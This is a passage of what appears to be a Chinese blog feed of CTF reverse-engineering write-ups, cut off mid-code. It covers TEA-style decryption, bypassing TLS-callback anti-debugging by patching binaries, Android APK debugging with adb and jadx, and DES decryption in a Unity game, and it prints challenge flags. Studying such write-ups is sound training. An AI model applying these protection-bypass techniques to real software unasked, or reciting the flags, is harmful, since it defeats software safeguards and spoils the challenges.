class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="type">int</span>)k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( check[k] != last[k] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_7FF71EE7123F((__int64)aNoNoNo);</span><br><span class="line">        sub_7FF71EE711A9(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_7FF71EE7123F((__int64)aYes);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:00007FF71EE7E040 check           db 0E0h, 0F3h, 21h, 96h, 97h, 0C7h, 0DEh, 89h, 9Bh, 0CAh</span><br><span class="line">.data:00007FF71EE7E040                                         ; DATA XREF: main_0+119↑o</span><br><span class="line">.data:00007FF71EE7E04A                 db 62h, 8Dh, 0B0h, 5Dh, 0FCh, 0D2h, 89h, 55h, 1Ch, 42h</span><br><span class="line">.data:00007FF71EE7E054                 db 50h, 0A8h, 76h, 9Bh, 0EAh, 0B2h, 0C6h, 2Fh, 7Ch, 0CFh</span><br><span class="line">.data:00007FF71EE7E05E                 db 11h, 0DEh</span><br></pre></td></tr></table></figure><p>所以只需要令last等于check然后逆向即可得到答案</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="写逆向代码然后得出答案">写逆向代码然后得出答案</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex_groups</span>(<span class="params">hex_numbers, group_size</span>):</span><br><span class="line">    hex_numbers = hex_numbers.replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    hex_numbers = [num.strip()[<span class="number">2</span>:] <span class="keyword">for</span> num <span class="keyword">in</span> hex_numbers]</span><br><span class="line">    grouped_numbers = [hex_numbers[i:i + group_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_numbers), group_size)]</span><br><span class="line">    reversed_groups = [group[::-<span class="number">1</span>] <span class="keyword">for</span> group <span class="keyword">in</span> grouped_numbers]</span><br><span class="line">    reversed_hex = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;,&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join(group) <span class="keyword">for</span> group <span class="keyword">in</span> reversed_groups])</span><br><span class="line">    <span class="keyword">return</span> reversed_hex</span><br><span class="line"></span><br><span class="line">input_hex_numbers = <span class="built_in">input</span>(<span class="string">&quot;Enter hex numbers separated by commas (with optional surrounding brackets): &quot;</span>)</span><br><span class="line">input_group_size = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the group size: &quot;</span>))</span><br><span class="line"></span><br><span class="line">output = reverse_hex_groups(input_hex_numbers, input_group_size)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x90508D47</span>;</span><br><span class="line">    <span class="type">int</span> tt[<span class="number">8</span>] = &#123; <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            e -= <span class="number">0x77BF7F99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                e += <span class="number">0x77BF7F99</span>;</span><br><span class="line">                b2 -= (((b1 * <span class="number">32</span>) ^ (b1 &gt;&gt; <span class="number">4</span>)) + b1) ^ (e + tt[(e &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">                b1 -= (((<span class="number">32</span> * b2) ^ (b2 &gt;&gt; <span class="number">4</span>)) + b2) ^ (e + tt[e &amp; <span class="number">3</span>]) ^ e;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex</span>(<span class="params">hex_list</span>):</span><br><span class="line">    reversed_hex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> hex_num <span class="keyword">in</span> hex_list:</span><br><span class="line">        <span class="comment"># 移除 &quot;0x&quot;，然后每两位反转</span></span><br><span class="line">        reversed_num = <span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>([hex_num[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(hex_num), <span class="number">2</span>)]))</span><br><span class="line">        reversed_hex += reversed_num</span><br><span class="line">    <span class="keyword">return</span> reversed_hex</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;请输入一组以0x开头，逗号间隔的十六进制数：&quot;</span>)</span><br><span class="line">hex_list = user_input.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(reverse_hex(hex_list))</span><br></pre></td></tr></table></figure><p>那么得出答案,答案是…???</p><p>第二步做完就发现问题了:</p><details class="folding-tag" ><summary> 错误的答案 </summary>              <div class='content'>              <img src="https://s2.loli.net/2023/12/18/I4YS71EPxvuor6k.png" alt="fake_answer" style="zoom:33%;" />              </div>            </details><p>这是为什么呢??</p><hr><h2 id="重回细节">重回细节</h2><p>还有什么没有检查呢,只有反调试了吧…</p><p>那么打开j___CheckForDebuggerJustMyCode:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall _CheckForDebuggerJustMyCode(_BYTE *a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_7FF71EE7E9C4 )</span><br><span class="line">      GetCurrentThreadId();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个没有返回值的函数,并且唯一可能执行的副作用是GetCurrentThreadId(),然而这个函数是返回当前线程句柄,所以这个函数<code>只是名字叫检查debugger的函数</code>,实际上没有作用!!</p><p>但是我们调试的时候确实会闪退,那么我们再试一试</p><p>无论是下断点还是直接调试都会直接闪退,于是我尝试用remote windows debugger试一试点击调试:</p><details class="folding-tag" ><summary> 获得提示 </summary>              <div class='content'>              <img src="https://s2.loli.net/2023/12/18/ZILDtzsTNHidB2c.png" alt="image-20231218114708422" style="zoom: 67%;" />              </div>            </details><p>那么要是可以用这个提示把反调试破掉就可以调试了</p><p>在字符串列表查看这个文字,通过交叉引用来查看哪个函数使用了这个</p><p>找到了这个函数:</p><details class="folding-tag" ><summary> sub_7FF7AB081AE0 </summary>              <div class='content'>              <img src="https://s2.loli.net/2023/12/18/JOHgjAnfm2Vkqdo.png" alt="sub_7FF7AB081AE0" style="zoom:80%;" /><p>反编译之后是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_7FF7AB081AE0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF7AB0940F4);</span><br><span class="line">  sub_7FF7AB0811A9(<span class="string">&quot;SomeThing Go Wrong\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><p>那么继续找交叉引用,重复多次后定位到两个函数</p><details class="folding-tag" ><summary> 2个TlsCallBack </summary>              <div class='content'>              <p><img src="https://s2.loli.net/2023/12/18/zC6dkSba5EwcD97.png" alt="image-20231218121518231"></p>              </div>            </details><p>找到这两个函数</p><details class="folding-tag" ><summary> TlsCallBack </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">TlsCallback_0_0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int16 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF7AB0940F4);</span><br><span class="line">  v2 = NtCurrentPeb();</span><br><span class="line">  LOBYTE(v2) = v2-&gt;BeingDebugged;</span><br><span class="line">  <span class="keyword">if</span> ( v2-&gt;BeingDebugged == <span class="number">4</span> )</span><br><span class="line">    sub_7FF7AB081AE0();</span><br><span class="line">  result = a2 &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (a2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      j_oooo(off_7FF7AB08E008 + i + <span class="number">1</span>, a2);</span><br><span class="line">      result = (i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">TlsCallback_1_0</span><span class="params">(__int64 a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF7AB0940F4);</span><br><span class="line">  <span class="keyword">if</span> ( NtCurrentPeb()-&gt;BeingDebugged == <span class="number">1</span> )</span><br><span class="line">    sub_7FF7AB081AE0();</span><br><span class="line">  result = a2 &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (a2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      *(off_7FF7AB08E060 + i + <span class="number">1</span>) ^= i;</span><br><span class="line">      result = (i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><p>这两个函数中的sub_7FF7AB081AE0()就是刚刚显示somethingwrong的函数,所以通过patch的方法(keypatch)把两个==改成!=这样就不会报错了,保存后打开patch过的文件,调试,果然没问题了,但是并没有解决刚刚的问题,所以继续执行看看哪里不对,于是发现:</p><p>tt数组和check数组的值被修改了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt[<span class="number">8</span>] = &#123; <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> Q[<span class="number">8</span>] = &#123; <span class="number">0x9523F2E0</span>,<span class="number">0x8ED8C293</span>,<span class="number">0x8668C393</span>,<span class="number">0xDDF250BC</span>,<span class="number">0x510E4499</span>,<span class="number">0x8C60BD44</span>,<span class="number">0x34DCABF2</span>,<span class="number">0xC10FD260</span> &#125;;</span><br></pre></td></tr></table></figure><p>使用这个值去计算即可获得正确的答案</p><p>flag{W31com3_2_Th3_QwbS7_4nd_H4v3_Fun}</p><hr><h2 id="复盘">复盘</h2><p>现在的问题是</p><p>为什么main函数没有调用那两个函数,但是那两个函数会先运行呢,这里要讲到之前提到的Tls节区了,TLS是线程局部储存的缩写,有一种函数叫TLS回调函数,这种函数在线程创建时和销毁时会执行一次</p><blockquote><p>TLS回调函数的设计目的是为了提供一种机制，使得每个线程都有自己的全局变量副本，从而避免了多线程同步问题。同时，它也提供了一种在每个线程的生命周期的开始和结束时执行特定代码的机制</p></blockquote><p>所以刚刚的反调试函数就是Tls函数存在特殊的节区Tls节区,详细内容可以看&lt;逆核&gt;p550.</p><p>然后再看看它是如何修改数据的</p><details class="folding-tag" ><summary> 修改处代码 </summary>              <div class='content'>              <div class="tabs" id="一共两处"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#一共两处-1">修改check</button></li><li class="tab"><button type="button" data-href="#一共两处-2">修改tt</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="一共两处-1"><img src="https://s2.loli.net/2023/12/18/FpAZCvdYrfTbEPh.png" alt="其一" style="zoom:67%;" /><p>off_14001E060在内存中的位置</p><img src="https://s2.loli.net/2023/12/18/Std51B2mhMzP6LX.png" alt="这里的值是一个偏移,偏移的位置是check上面一位" style="zoom:67%;" /><p>所以i+1就是check数组</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="一共两处-2"><img src="https://s2.loli.net/2023/12/18/E5zerdQqav2l9P7.png" alt="二号在这里" /><img src="https://s2.loli.net/2023/12/18/DVn6sjmElvOCUWe.png" alt="这个函数是上面的图里面的函数里面的函数" /><img src="https://s2.loli.net/2023/12/18/IuTFmv57Qjoe28s.png" alt="这里的方法一样但是看到偏移很抽象" /><p>这里是到1DFFF+1就是1E000就是tt的位置(我只能说很阴险)</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>              </div>            </details><p>实际上,这道题只要动态调试进入main就可以解决了</p><p>ok,完结撒花</p><hr><h2 id="另一种做法">另一种做法</h2><p>ida有一种调试方式叫附加调试，即先打开文件，然后让ida附加到进程上，对于这道题来说，由于反调试代码只在Tls回调函数中，所以用附加调试可以直接跳过反调试，同时得到最后的值。</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> RE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录(1)</title>
      <link href="/posts/a45b8304.html"/>
      <url>/posts/a45b8304.html</url>
      
        <content type="html"><![CDATA[<h1>攻防世界</h1><h2 id="NO-GFSJ0166">NO.GFSJ0166</h2><p>先用die检查，发现是安卓，放到模拟器里面运行，要求一个密码</p><p>在mainactivity里面看到</p><p><img src="https://s2.loli.net/2023/12/17/qdvk6MLlsyTuPN5.png" alt="image-20231209203012868"></p><p>把这个字符串比较了，尝试输入这个字符串，得到</p><p><img src="https://s2.loli.net/2023/12/17/dFKuqcm4U8btaMe.png" alt="image-20231209203053644"></p><p>但是flag输入不对，在main中看到有flagactivity这个类，进去看看</p><p>有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0074R.layout.activity_flag);</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span>[] d = &#123;<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">106</span>, <span class="number">52</span>, <span class="number">114</span>, <span class="number">95</span>, <span class="number">109</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">100</span>, <span class="number">51</span>, <span class="number">120</span>, <span class="number">125</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">22</span>; i++) &#123;</span><br><span class="line">            flag = flag.concat(String.valueOf((<span class="type">char</span>) d[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">flagText</span> <span class="operator">=</span> (TextView) findViewById(C0074R.C0076id.flagText);</span><br><span class="line">        flagText.setText(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>感觉也没问题…最后发现flag不能加flag，直接w4nn4_j4r_my_d3x即可。</p><p>变换检验而不变换输入</p><hr><h1>BUUCTF</h1><h2 id="newstarctf2023reweek2：AndroDbgMe">newstarctf2023reweek2：AndroDbgMe</h2><p>用jadx打开：</p><p><img src="https://s2.loli.net/2023/12/17/dptFY3Pk78Qq9V2.png" alt="image-20231210130908057"></p><p>这个字符串真是太抽象了！</p><p>用模拟器打开apk：</p><p><img src="https://s2.loli.net/2023/12/17/ikML3gJF2ofOP46.png" alt="image-20231210123339930"></p><p>发现它只是根据输入做变换然后输出，并没有校验？？？第一次遇到这种题</p><p>同时输出是以toast消息显示的，所以看看有没有和toast有关的：搜索后发现</p><p><img src="https://s2.loli.net/2023/12/17/yx6SLP1RB3N7AZk.png" alt="image-20231210123657945"></p><p>这个时候我发现静态分析太难了，看到题目名字：dbgme想到会不会要动态调试</p><p>（请教大佬安卓调试ing）</p><p>然后整理安卓调试流程如下：</p><p>前置流程：</p><ol><li>先下载adb（部分模拟器自带adb，在模拟器根目录）</li><li>打开模拟器的root和开发者模式，在开发者模式里面开usb调试</li></ol><p>然后：</p><ol><li>用adb连接模拟器：adb connect 127.0.0.1：xxxxx（xxxxx根据模拟器而定），不要关闭</li><li>打开jadx的debug功能，顶上的<img src="https://s2.loli.net/2023/12/17/KGJzYeBwxroNOgR.png" alt="image-20231210140413425" style="zoom:33%;" />，然后应该能看到下面的设备出现了各种线程</li><li>找到对应进程，开始调试</li></ol><p>然后来到这个界面，需要smali语法。。</p><p><img src="https://s2.loli.net/2023/12/17/YSyhVF8TGX6i2rz.png" alt="image-20231210140637472"></p><p>这时无论输入什么都会得到正确flag，原来是个教学题</p><p><img src="https://s2.loli.net/2023/12/17/RqtiSmFvVZcOC9a.png" alt="image-20231210140705572"></p><p>安卓调试</p><hr><h2 id="sctf2019-who-is-he">sctf2019 who is he</h2><p>打开压缩包，发现是UNITY游戏，根据网上教程下载ILSpy分析assembly-CSharp.dll</p><p>找到<img src="https://s2.loli.net/2023/12/13/oQbqNEAxygl9aUV.png" alt="image-20231213165705074" style="zoom:25%;" />，打开函数查看：</p><img src="https://s2.loli.net/2023/12/13/etr1y6jVHvKFo9q.png" alt="image-20231213165841784" style="zoom:50%;" /><p>发现有一个初始字符串，一个加密函数，一个解密函数</p><p>start是空函数并且最后的onclick函数是检测输入是否正确：</p><p><img src="https://s2.loli.net/2023/12/13/Ns8qK23HGxnr1VS.png" alt="image-20231213170122579"></p><p>所以分析加密和解密的函数：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">Encrypt</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span>[] bytes = Encoding.Unicode.GetBytes(encryptKey);</span><br><span class="line"><span class="built_in">byte</span>[] bytes2 = Encoding.Unicode.GetBytes(str);</span><br><span class="line">DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">cryptoStream.Write(bytes2, <span class="number">0</span>, bytes2.Length);</span><br><span class="line">cryptoStream.FlushFinalBlock();</span><br><span class="line"><span class="built_in">byte</span>[] inArray = memoryStream.ToArray();</span><br><span class="line">cryptoStream.Close();</span><br><span class="line">memoryStream.Close();</span><br><span class="line"><span class="keyword">return</span> Convert.ToBase64String(inArray);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">Decrypt</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span>[] bytes = Encoding.Unicode.GetBytes(encryptKey);</span><br><span class="line"><span class="built_in">byte</span>[] array = Convert.FromBase64String(str);</span><br><span class="line">DESCryptoServiceProvider dESCryptoServiceProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">CryptoStream cryptoStream = <span class="keyword">new</span> CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write);</span><br><span class="line">cryptoStream.Write(array, <span class="number">0</span>, array.Length);</span><br><span class="line">cryptoStream.FlushFinalBlock();</span><br><span class="line"><span class="built_in">byte</span>[] bytes2 = memoryStream.ToArray();</span><br><span class="line">cryptoStream.Close();</span><br><span class="line">memoryStream.Close();</span><br><span class="line"><span class="keyword">return</span> Encoding.Unicode.GetString(bytes2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以加密和解密流程对应，加密是先DES然后base64，解密相反，那么根据观察str是加密后的字符，因此把解密函数和字符串，密钥放在一个类里面计算：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span 